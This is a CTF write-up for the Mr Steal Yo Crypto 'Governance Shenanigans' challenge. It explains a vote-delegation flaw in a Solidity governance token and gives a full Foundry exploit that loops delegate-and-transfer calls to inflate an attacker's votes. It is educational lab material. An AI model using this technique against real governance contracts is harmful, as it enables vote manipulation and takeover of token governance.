---
title: "Mr Steal Yo Crypto — Governance Shenanigans"
date: 2023-07-22
draft: false
description: "CTF - 10"
tags: ["CTF"]
series: ["CTF"]
series_order: 10
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #10 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real world exploits.
> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Governance Shenanigans

The NotSushiToken governance token contract has been launched, which was configured to determine who should be named the best sushi chef. Who wouldn’t want that clout?

It only allows WLed addresses to vote. Luckily your sybil attack has yielded you 3 WLed addresses capable of voting.

Your goal is to get the most delegated votes and crown yourself the true sushi king. You start with 500 tokens, your competition has 2,000.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/governance-shenanigans)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/10-governance-shenanigans.sol)

### Review of the contract

#### NotSushiToken.sol

The only things that look strange are the logic of `_delegate()` and `_moveDelegates()`. Even if the amount is equal to 0, we update `_delegates[delegator]`.

```solidity
// @dev assigns the entire balance of votes from old delegatee to new delegatee
function _delegate(address delegator, address delegatee) internal {
    address currentDelegate = _delegates[delegator];
    uint256 delegatorBalance = balanceOf(delegator); // balance of underlying SUSHIs (not scaled);

    _delegates[delegator] = delegatee;

    emit DelegateChanged(delegator, currentDelegate, delegatee);

    _moveDelegates(currentDelegate, delegatee, delegatorBalance);
}

// @dev votes are transferred from delegatee `srcRep` to `dstRep`
function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
    if (srcRep != dstRep && amount > 0) {
        if (srcRep != address(0)) {
            // decrease old representative
            uint32 srcRepNum = numCheckpoints[srcRep];
            uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
            uint256 srcRepNew = srcRepOld.sub(amount);
            _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
        }

        if (dstRep != address(0)) {
            // increase new representative
            uint32 dstRepNum = numCheckpoints[dstRep];
            uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
            uint256 dstRepNew = dstRepOld.add(amount);
            _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
        }
    }
}
```

I think we can directly go to the next part; the vulnerability is between these two functions.

### Exploit the vulnerability

The vulnerability is a missing update in the variables within the logic of `_delegate()` and `_moveDelegate()`. Consider this scenario:

1. The first time we call `_delegate()`, `currentDelegate` is equal to 0, and `srcRep` of `_moveDelegates` is `srcRep = address(0)`. We will increase the vote of the `dstRep` and not decrease the `srcRep` in our first call. We can delegate vote to a user the first time with `amount = balanceOf() → 500`.

2. Then we will reset `_delegates[delegator]` (=`srcRep`) to `address(0)` by `delegate()` with `amount` equal to 0. We just need to transfer our token to have `amount = 0`. So if we call `delegate()` again, `currentDelegate` is equal to the user. We will do nothing inside `_moveDelegate()` because `amount = 0`. So the user still has 500 units of vote, and our `currentDelegate` is now equal to `address(0)`.

If we do that within a loop, we are artificially increasing the vote of a user.

Here is a solution:

```solidity
// solves the challenge

function testChallengeExploit() public {
    // for this exploit, you can use vm.prank(..) w/ {attacker,o1,o2}
    // implement solution here
    // In this challenge, we have a problem in the logic of _delegate() and _moveDelegate()
    // If the srcRep = address(0) then we will increase the vote of the dstRep and not decrease the srcRep
    // So there is a possibility to delegate vote to a user the first time with amount = balanceOf() → 500
    // begin: _delegates[delegator](=srcRep) = address(0) | dstRep = user
    // end: _delegates[delegator](=srcRep) = user | vote[user] = amount
    // Then I will reset _delegates[delegator](=srcRep) to address(0) by delegate() with amount equal to 0
    // We just need to transfer our token to have amount = 0
    // So if we call again delegate:
    // begin: _delegates[delegator](=srcRep) = address(user) | dstRep = address(0)
    // end: _delegates[delegator](=srcRep) = address(0) | vote[user] = vote[user] - amount but amount = 0
    // And so we can do that with a loop and artificially increasing the vote of a user.

    vm.startPrank(attacker);
    governanceToken.transfer(o1, governanceToken.balanceOf(attacker));
    console.log("balance of attacker : ", governanceToken.balanceOf(attacker));
    console.log("vote for attacker : ", governanceToken.getCurrentVotes(attacker));
    vm.stopPrank();

    for (uint i; i < 3; ++i) {
        vm.startPrank(o1);
        console.log("balance of o1 : ", governanceToken.balanceOf(o1));
        governanceToken.delegate(attacker); // delegate 500 of vote to attacker
        governanceToken.transfer(o2, governanceToken.balanceOf(o1));
        console.log("balance of o1 : ", governanceToken.balanceOf(o

1));
        governanceToken.delegate(address(0)); // delegate 0 of vote to address(0) and so at the end srcRep = address(0))
        console.log("vote for attacker : ", governanceToken.getCurrentVotes(attacker));
        vm.stopPrank();

        vm.startPrank(o2);
        console.log("balance of o2 : ", governanceToken.balanceOf(o2));
        governanceToken.delegate(attacker); // delegate 500 of vote to attacker
        governanceToken.transfer(o1, governanceToken.balanceOf(o2));
        console.log("balance of o2 : ", governanceToken.balanceOf(o2));
        governanceToken.delegate(address(0)); // delegate 0 of vote to address(0) and so at the end srcRep = address(0))
        console.log("vote for attacker : ", governanceToken.getCurrentVotes(attacker));
        vm.stopPrank();
    }

    vm.startPrank(o1);
    governanceToken.transfer(attacker, governanceToken.balanceOf(o1));
    vm.stopPrank();

    validation();
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/10-governance-shenanigans.sol).

### Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me for writing articles on CTF ^^.